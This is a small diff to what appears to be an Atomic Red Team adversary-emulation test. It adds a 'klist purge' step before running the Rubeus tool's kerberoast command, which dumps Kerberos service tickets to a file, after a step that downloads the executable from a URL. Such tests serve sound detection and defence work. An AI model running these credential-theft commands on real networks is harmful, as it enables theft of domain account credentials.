@@ -70,6 +70,7 @@ atomic_tests:
       Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
   executor:
     command: |
+      klist purge
       cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"
     cleanup_command: |
       Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
